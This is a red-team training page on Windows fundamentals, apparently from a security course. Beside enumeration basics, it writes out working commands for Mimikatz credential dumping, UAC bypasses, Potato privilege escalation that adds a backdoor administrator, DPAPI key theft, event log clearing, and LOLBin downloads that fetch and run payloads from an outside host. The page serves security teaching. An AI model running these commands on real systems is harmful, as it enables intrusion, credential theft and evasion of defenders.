---
layout: training-page
title: "Windows Fundamentals — Red Team Academy"
module: "Fundamentals"
tags:
  - windows
  - powershell
  - active-directory
page_key: "fundamentals-windows-basics"
render_with_liquid: false
---

# Windows Fundamentals for Red Teamers

![Windows architecture layers: user applications, Win32 API and .NET CLR, security layer (LSA/AMSI/Defender/ETW), Windows kernel, and hardware — with red team attack surface notes for each layer](/images/fundamentals/windows-arch-layers.svg)  
*// windows architecture layers — attack surface from user-mode to kernel*

## Windows Directory Structure

| Path | Contents | Red Team Interest |
| --- | --- | --- |
| C:\Windows\System32 | Core OS binaries | LOLBins, DLL hijacking targets |
| C:\Windows\SysWOW64 | 32-bit binaries on 64-bit OS | 32-bit payload execution |
| C:\Users\<user> | User profiles | AppData, browser creds, SSH keys, stored passwords |
| C:\Users\<user>\AppData | App data (hidden) | Browser password DBs, putty sessions, MobaXterm creds |
| C:\ProgramData | All-user app data | AV configs, app credentials, writable for persistence |
| HKLM\SAM | Local account hashes (registry) | Dump for PTH — requires SYSTEM |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Run | Autostart on user logon | Classic persistence location (T1547.001) |

## PowerShell Essentials for Red Teamers

PowerShell is the primary living-off-the-land tool on Windows. Learn to abuse it before defenders restrict it.

```
# Execution policy bypass (common ways)
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy -Scope CurrentUser Bypass -Force

# System enumeration
$env:USERNAME; $env:COMPUTERNAME; $env:USERDOMAIN  # Basic info
whoami /all                           # User + privileges + groups
systeminfo                            # OS version, patches, domain
Get-WmiObject Win32_OperatingSystem   # OS info via WMI
Get-Process                           # Running processes
Get-Service | Where-Object {$_.Status -eq "Running"}  # Running services
Get-ChildItem -Hidden C:\Users\       # Show hidden files/dirs

# Network enumeration
ipconfig /all                         # IP, DNS, DHCP info
arp -a                                # ARP table — discover live hosts
netstat -ano                          # Active connections with PIDs
route print                           # Routing table — find other networks
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}  # Listening ports

# User and group enumeration
net user                              # Local users
net localgroup administrators         # Local admins
net group "Domain Admins" /domain     # Domain Admins group
Get-ADUser -Filter * -Properties *    # All AD users (requires RSAT)
Get-LocalUser                         # Local users (PS cmdlet)
```

## Windows Authentication & Credential Storage

Understanding how Windows stores and uses credentials is foundational to nearly all AD attacks.

### NTLM Authentication

- Windows stores passwords as **NTLM hashes** (MD4 of UTF-16LE password) in the SAM database or LSASS memory
- NTLM hashes can be used for **Pass-the-Hash (PTH)** — you don't need the plaintext password
- Format: `username:RID:LMHash:NTHash:::`

### Kerberos Authentication

- Used in Active Directory environments — tickets instead of passwords over the network
- **TGT (Ticket Granting Ticket)** — Issued by KDC after password auth; used to request service tickets
- **TGS (Ticket Granting Service)** — Service-specific ticket; what Kerberoasting targets
- Tickets stored in memory — can be **dumped and reused (Pass-the-Ticket)**

### Credential Locations

```
# LSASS process — holds plaintext creds (older systems) and NTLM hashes
# Dump with Mimikatz:
sekurlsa::logonpasswords

# SAM database — local account hashes
# Dump with:
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
# Then offline: impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Windows Credential Manager
cmdkey /list                           # List stored credentials
# Dump: mimikatz vault::list

# Browser credentials
# Chrome: %AppData%\Local\Google\Chrome\User Data\Default\Login Data (SQLite)
# Firefox: %AppData%\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json
```

## Active Directory Basics

Active Directory is the authentication and authorization backbone of most enterprise Windows environments. Understanding its structure is required before any AD attack.

### Core AD Objects

- **Domain** — Security boundary containing users, computers, and groups (e.g., `corp.local`)
- **Forest** — Collection of one or more domains sharing a schema. Trust relationships allow cross-domain access.
- **Domain Controller (DC)** — Server running AD DS. Holds the NTDS.dit database with all domain credentials.
- **Organizational Unit (OU)** — Container for organizing AD objects; Group Policy is applied at OU level.
- **Group Policy (GPO)** — Configuration pushed to computers/users in an OU. Misconfigured GPOs = privesc vector.
- **Service Account** — Account used by services; often has elevated privileges and weak passwords. Kerberoasting target.

### Key AD Enumeration Commands

```
# Native Windows commands (no tools needed)
net user /domain                       # All domain users
net group /domain                      # All domain groups
net group "Domain Admins" /domain      # Members of Domain Admins
net group "Enterprise Admins" /domain  # Higher-value target group
nltest /dclist:corp.local              # List all DCs in domain
nltest /domain_trusts                  # Show trust relationships

# PowerShell AD queries (requires domain membership)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([ADSISearcher]"objectClass=user").FindAll() | Select -Expand Properties

# With PowerView (import first)
Import-Module .\PowerView.ps1
Get-NetDomain                          # Domain info
Get-NetUser | Select samaccountname    # All users
Get-NetGroup -GroupName "Domain Admins" # Group members
Find-LocalAdminAccess                  # Where does current user have local admin?
Get-NetGPO | Select displayname, gpcfilesyspath  # All GPOs
```

## Integrity Levels & UAC

Windows Mandatory Integrity Control (MIC) assigns every process and object an **integrity level**. UAC is the mechanism that separates a logged-in admin's day-to-day Medium IL token from their elevated High IL token. Most privesc techniques ultimately involve crossing this boundary.

```
# Check your current integrity level:
whoami /groups | findstr "Mandatory"
# S-1-16-4096   Low Mandatory Level     ← sandboxed (browser, protected processes)
# S-1-16-8192   Medium Mandatory Level  ← standard user token (default even for admins)
# S-1-16-12288  High Mandatory Level    ← elevated admin token (after UAC prompt)
# S-1-16-16384  System Mandatory Level  ← SYSTEM processes

# Confirm your token type (admin running Medium = UAC not elevated):
whoami /priv
# If SeDebugPrivilege is NOT present → Medium token, UAC blocking elevation

# Common UAC bypass techniques:

# 1. fodhelper.exe (T1548.002) — auto-elevates, reads HKCU registry:
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# 2. eventvwr.exe — reads HKCU for .msc handler:
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# 3. Check if ConsentPromptBehaviorAdmin = 0 (no UAC prompt — auto-elevate):
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0x0 = auto-elevate (no prompt) — UAC effectively disabled for admins
```

## Token Impersonation

Windows tokens represent security context. If you have `SeImpersonatePrivilege` (given by default to local service accounts — IIS, SQL Server, etc.), you can impersonate any token on the system, including SYSTEM. This is the core of the Potato family of exploits.

```
# Check for impersonation privileges:
whoami /priv | findstr "Impersonate\|Assignprimary\|Debug"
# SeImpersonatePrivilege → Potato attacks, PrintSpoofer
# SeAssignPrimaryTokenPrivilege → same family
# SeDebugPrivilege → can open any process (dump LSASS, inject)

# PrintSpoofer — SYSTEM from SeImpersonatePrivilege (Windows 10/Server 2019):
# https://github.com/itm4n/PrintSpoofer
.\PrintSpoofer.exe -i -c cmd          # Interactive SYSTEM shell
.\PrintSpoofer.exe -c "whoami"        # Non-interactive command

# GodPotato — works on Windows Server 2012–2022 + Windows 8–11:
# https://github.com/BeichenDream/GodPotato
.\GodPotato -cmd "cmd /c whoami"
.\GodPotato -cmd "cmd /c net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add"

# RoguePotato — alternative for Server 2019+ when PrintSpoofer is blocked:
.\RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe /c whoami > C:\temp\output.txt"

# After gaining SYSTEM — create admin user or dump credentials:
net user backdoor Password123! /add
net localgroup administrators backdoor /add
# Or dump LSASS:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## DPAPI — Credential Decryption

Data Protection API (DPAPI) is used by Windows to encrypt stored credentials — browser passwords, Windows Credential Manager, WiFi keys, and more. As the logged-in user you can decrypt your own DPAPI blobs silently. With SYSTEM or DC access you can decrypt anyone's.

```
# DPAPI master key location:
# %AppData%\Microsoft\Protect\{SID}\*  ← user master keys
# %windir%\System32\Microsoft\Protect\  ← machine master keys

# Decrypt credentials with Mimikatz (as target user or admin):
dpapi::masterkey /in:"%AppData%\Microsoft\Protect\{SID}\{GUID}" /rpc
dpapi::cred /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\{GUID}"
dpapi::blob /in:C:\path\to\blob.bin /masterkey:{key_hex}

# Chrome/Edge saved passwords (user context only — you ARE the user):
# Location: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# Decrypt with: https://github.com/moonD4rk/HackBrowserData
.\HackBrowserData.exe -b chrome -f json -o /tmp/chrome-creds

# Windows Credential Manager:
cmdkey /list                            # List stored credentials
# Dump all credential blobs:
mimikatz "vault::list" "vault::cred /patch" "exit"

# If you have DC access — decrypt any user's DPAPI with domain backup key:
# Backup key never changes — one key decrypts all domain users' DPAPI blobs
mimikatz "lsadump::backupkeys /system:DC01.corp.local /export" "exit"
# Then offline decryption of any DPAPI blob using the backup key
```

## AppLocker & WDAC Awareness

AppLocker and WDAC (Windows Defender Application Control) are application whitelisting controls. Understanding them prevents you from dropping tools that won't execute. Always check before staging payloads.

```
# Check if AppLocker is enforced:
Get-AppLockerPolicy -Effective -Xml
# Or from cmd:
reg query HKLM\Software\Policies\Microsoft\Windows\SrpV2

# Check what's allowed under AppLocker:
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Writable AppLocker bypass paths (default allow list includes):
# C:\Windows\Tasks\
# C:\Windows\Temp\
# C:\Windows\System32\spool\drivers\color\
# C:\Users\Public\
# Trusted installer paths: C:\Windows\*, C:\Program Files\*

# Check WDAC enforcement:
Get-CimInstance Win32_DeviceGuard
# CodeIntegrityPolicyEnforcementStatus: 2 = Enforced, 1 = Audit, 0 = Off

# PowerShell CLM (Constrained Language Mode) — set by AppLocker/WDAC:
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = AppLocker/WDAC active
# FullLanguage = no restrictions

# Bypass CLM: use a compiled .NET executable (not subject to AppLocker PS rules),
# or downgrade to PS v2 (predates CLM) — see AMSI Bypass page

# InstallUtil bypass (whitelisted in default AppLocker rules):
# Compile a C# class deriving from Installer and run:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

## Windows Event Logs — What Defenders Watch

Know what you're generating before defenders catch it:

| Event ID | Log | Triggered By |
| --- | --- | --- |
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon — password spray detection |
| 4648 | Security | Explicit credential use (runas, PTH) |
| 4698 | Security | Scheduled task created — persistence detection |
| 4720 | Security | User account created |
| 4768/4769 | Security | Kerberos TGT/TGS requests — Kerberoasting |
| 7045 | System | New service installed — persistence detection |
| 4104 | PowerShell | PowerShell script block logging — caught by SIEM |

```
# Clear Windows event logs (requires admin — noisy!)
wevtutil cl System
wevtutil cl Security
wevtutil cl "Windows PowerShell"

# Better: use Mimikatz event log wiper or invoke-phant0m
# Or: just don't generate avoidable logs in the first place
```

## LOLBins — Living Off the Land Binaries

LOLBins are legitimate Windows binaries abused to run code, bypass defenses, or transfer files. They're on every Windows system and often whitelisted.

```
# Execute arbitrary commands
certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Windows\Temp\p.exe
mshta http://10.10.10.10/payload.hta
wscript.exe //E:jscript payload.js
regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll
rundll32 javascript:"\..\mshtml,RunHTMLApplication "

# Download files
certutil -urlcache -split -f http://10.10.10.10/file.exe output.exe
bitsadmin /transfer job http://10.10.10.10/file.exe C:\Temp\file.exe
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/f.exe","C:\Temp\f.exe")
Invoke-WebRequest -Uri http://10.10.10.10/f.exe -OutFile C:\Temp\f.exe

# Full reference: https://lolbas-project.github.io/
```

## Key Resources

- `https://lolbas-project.github.io` — LOLBAS: Living Off The Land Binaries & Scripts
- `https://github.com/PowerShellMafia/PowerSploit` — PowerView and PowerUp
- `https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation` — Windows privesc checklist
- `https://github.com/peass-ng/PEASS-ng` — WinPEAS automated enumeration
- `https://adsecurity.org` — Sean Metcalf's AD security deep dives
